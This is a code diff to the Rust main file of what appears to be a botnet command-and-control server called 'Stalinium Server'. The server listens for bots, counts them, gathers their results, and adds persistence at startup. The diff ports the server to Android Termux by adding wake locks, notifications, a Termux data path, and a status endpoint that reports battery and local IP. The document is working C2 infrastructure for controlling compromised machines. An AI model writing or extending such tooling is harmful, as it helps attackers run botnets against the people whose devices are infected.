@@ -9,6 +9,7 @@ mod p2p;
 mod agentic;
 mod persistence;
 mod db;
+mod termux;
 
 use std::collections::HashMap;
 use std::net::SocketAddr;
@@ -132,6 +133,32 @@ async fn bot_count_handler(
     }
 }
 
+async fn server_status_handler(
+    State(state): State<Arc<AppState>>,
+) -> Json<serde_json::Value> {
+    let is_termux = termux::is_termux();
+    let bot_count = state.db.bot_count().unwrap_or(0);
+    let battery = if is_termux { termux::battery_status() } else { None };
+    let local_ip = if is_termux { termux::local_ip() } else { None };
+
+    let mut status = serde_json::json!({
+        "platform": if is_termux { "android-termux" } else { std::env::consts::OS },
+        "arch": std::env::consts::ARCH,
+        "bots_connected": bot_count,
+        "p2p_enabled": state.config.p2p.enabled,
+        "agentic_enabled": state.config.agentic.enabled,
+    });
+
+    if let Some(bat) = battery {
+        status["battery"] = serde_json::to_value(bat).unwrap_or_default();
+    }
+    if let Some(ip) = local_ip {
+        status["local_ip"] = serde_json::json!(ip);
+    }
+
+    Json(status)
+}
+
 async fn handle_bot(
     mut socket: tokio::net::TcpStream,
     addr: SocketAddr,
@@ -203,10 +230,17 @@ async fn handle_bot(
 async fn main() -> Result<(), C2Error> {
     let config = Config::load();
 
+    if termux::is_termux() {
+        eprintln!("[*] Termux environment detected (Android, no root)");
+        termux::acquire_wake_lock();
+        termux::notify("Stalinium Server", "Starting up...");
+    }
+
     persistence::add_persistence();
 
     let tcp_addr = config.settings.tcp_address.clone();
     let admin_addr = config.settings.admin_address.clone();
+    let admin_addr_display = admin_addr.clone();
 
     if config.p2p.enabled {
         let gossip_addr: SocketAddr = config.p2p.gossip_address.parse()
@@ -242,7 +276,12 @@ async fn main() -> Result<(), C2Error> {
         });
     }
 
-    let db = ServerDb::open("stalinium_server.db")
+    let db_path = if termux::is_termux() {
+        format!("{}/stalinium_server.db", termux::data_dir())
+    } else {
+        "stalinium_server.db".to_string()
+    };
+    let db = ServerDb::open(&db_path)
         .expect("Failed to open server database");
 
     let state = Arc::new(AppState {
@@ -261,6 +300,7 @@ async fn main() -> Result<(), C2Error> {
             .route("/api/results", get(get_results))
             .route("/api/cluster", get(cluster_summary_handler))
             .route("/api/bot_count", get(bot_count_handler))
+            .route("/api/status", get(server_status_handler))
             .with_state(admin_state);
 
         let listener = TcpListener::bind(&admin_addr).await.unwrap();
@@ -272,6 +312,16 @@ async fn main() -> Result<(), C2Error> {
         .await
         .map_err(|e| C2Error::NetworkError(e.to_string()))?;
     eprintln!("[*] Listening for bots on {}", tcp_addr);
+
+    if termux::is_termux() {
+        let ip_info = termux::local_ip()
+            .map(|ip| format!(" ({})", ip))
+            .unwrap_or_default();
+        termux::notify(
+            "Stalinium Server",
+            &format!("Running{} | TCP:{} Admin:{}", ip_info, tcp_addr, admin_addr_display),
+        );
+    }
 
     loop {
         let (socket, addr) = listener
